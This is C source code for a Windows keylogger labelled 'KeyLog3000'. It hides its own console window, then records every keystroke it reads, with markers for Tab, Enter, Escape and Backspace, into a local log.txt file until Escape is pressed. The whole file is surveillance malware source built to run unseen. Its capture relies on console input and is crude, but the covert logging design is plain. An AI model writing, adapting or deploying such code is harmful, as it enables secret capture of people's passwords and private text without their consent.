#include <stdio.h>
#include <string.h>
#include <conio.h>
#include <windows.h>
#include <time.h>

#define PATH "log.txt"

int main()
{
    FILE *f = fopen(PATH, "a+");
    char capt;

    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);

    time_t l;
    l = time(NULL);
    fprintf(f, "\n|KeyLog3000| %s \n", ctime(&l));

    int count = 0;
    
    while (1)
    {
        Sleep(20);
        if (kbhit())
        {
            capt = getch();
            count++;
            switch ((int)capt)
            {
            case ' ':
                fprintf(f, " ");
                break;
            case 0x09:
                fprintf(f, "[TAB]");
                break;
            case 0x0D:
                fprintf(f, "[ENTER]");
                break;
            case 0x1B:
                fprintf(f, "[ESC]");
                break;
            case 0x08:
                fprintf(f, "[BACKSPACE]");
                break;
            default:
                fputc(capt, f);
            }

            if ((int)capt == 0x1B)
            {
                fclose(f);
                return 0;
            }
        }
        if (count == 90)
        {
            fprintf(f, "\n");
            count = 0;
        }
    }
}